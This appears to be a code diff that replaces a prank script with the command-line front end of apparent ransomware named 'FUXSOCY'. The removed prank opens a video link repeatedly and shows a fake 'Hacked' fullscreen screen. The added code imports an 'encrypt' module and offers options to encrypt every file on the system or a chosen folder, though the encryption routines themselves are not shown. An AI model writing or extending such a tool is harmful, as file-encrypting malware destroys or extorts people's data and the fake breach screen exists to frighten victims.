@@ -1,34 +1,46 @@
-import webbrowser
+import argparse
 import time
-import os
-import tkinter as tk
+from encrypt import *
+from art import text2art
 
-url = "https://files.catbox.moe/xkls70.mp4"  # غير الرابط حسب رغبتك
+def logo():
+    logo = text2art("FUXSOCY","rand")
+    print("\n"+logo+"\n")
 
-# 1. فتح صفحة وحدة
-webbrowser.open(url)
+def include_parser():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-a", 
+                        "--all", 
+                        action="store_true", 
+                        help="Encrypt every bit of data in the system")
+    
+    parser.add_argument("-f",
+                        dest="folder",
+                        metavar="FOLDERNAME",
+                        help="Encrypts the mentioned folder")
 
-# 2. انتظر 4 ثواني
-time.sleep(4)
+    
+    parser.add_argument("-l",
+                        dest="logo",
+                        action = "store_true",
+                        help = "prints banner")
 
-# 3. فتح 10 صفحات
-for _ in range(10):
-    webbrowser.open(url)
+    
+    return parser
 
-# 4. انتظر 6 ثواني
-time.sleep(6)
+def main():
 
-# 5. نافذة وهمية (كأنها تهكير)
-root = tk.Tk()
-root.title("Hacked")
-root.configure(bg="black")
-root.attributes('-fullscreen', True)
+    parser = include_parser()
+    args = parser.parse_args()
+        
+    if args.logo:
+        logo()
+    
+    if args.all:
+        encrypt_system()
+    elif args.folder:
+        encrypt_folder(args.folder)
+    else:
+        parser.print_help()
 
-# نص التهكير
-label = tk.Label(root, text="""
-[!] SYSTEM BREACH DETECTED
-[!] Encrypting files...
-[!] Sending data to remote server...
-[!] Tracking your IP: 192.168.1.5
-[!] BIOS access granted...
-[!] Shuttin
+main()
